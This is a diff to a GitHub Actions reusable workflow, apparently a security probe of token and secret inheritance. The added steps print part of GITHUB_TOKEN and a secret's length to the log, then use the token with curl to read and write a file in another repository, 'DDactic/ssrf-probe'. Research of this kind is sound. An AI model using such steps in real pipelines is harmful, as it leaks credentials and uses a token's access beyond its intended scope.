@@ -10,13 +10,30 @@ jobs:
   callee:
     runs-on: ubuntu-latest
     steps:
-      - name: Print received secrets
+      - name: Print context and secrets
         run: |
-          echo "=== CALLEE WORKFLOW SECRET TEST ==="
-          echo "TEST_SECRET_INHERIT is set: ${{ secrets.TEST_SECRET_INHERIT != '' }}"
-          echo "TEST_SECRET_INHERIT value hash: $(echo -n '${{ secrets.TEST_SECRET_INHERIT }}' | sha256sum)"
-          echo "GITHUB_TOKEN prefix: ${GITHUB_TOKEN:0:10}"
+          echo "=== CALLEE CONTEXT ==="
           echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
-          echo "=== End ==="
+          echo "GITHUB_ACTOR: $GITHUB_ACTOR"
+          echo "GITHUB_TOKEN prefix: ${GITHUB_TOKEN:0:10}"
+          echo "=== SECRETS ==="
+          echo "TEST_SECRET_INHERIT is set: ${{ secrets.TEST_SECRET_INHERIT != '' }}"
+          echo "TEST_SECRET_INHERIT length: ${#TEST_SECRET_VALUE}"
+          echo "=== CROSS-REPO WRITE TEST ==="
+          echo "Attempting to write to DDactic/ssrf-probe using this GITHUB_TOKEN..."
+          RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
+            -H "Authorization: Bearer $GITHUB_TOKEN" \
+            "https://api.github.com/repos/DDactic/ssrf-probe/contents/t2-5-probe.txt" \
+            -X GET)
+          echo "GET DDactic/ssrf-probe/t2-5-probe.txt: HTTP $RESPONSE"
+          WRITE_RESP=$(curl -s -w "\nHTTP:%{http_code}" -X PUT \
+            -H "Authorization: Bearer $GITHUB_TOKEN" \
+            -H "Content-Type: application/json" \
+            "https://api.github.com/repos/DDactic/ssrf-probe/contents/t2-5-callee-write.txt" \
+            -d '{"message":"callee write test","content":"dDItNS10ZXN0Cg=="}')
+          WRITE_CODE=$(echo "$WRITE_RESP" | grep "HTTP:" | cut -d: -f2)
+          echo "Write to DDactic/ssrf-probe: HTTP $WRITE_CODE"
+          echo "=== END ==="
         env:
           GITHUB_TOKEN: ${{ github.token }}
+          TEST_SECRET_VALUE: ${{ secrets.TEST_SECRET_INHERIT }}
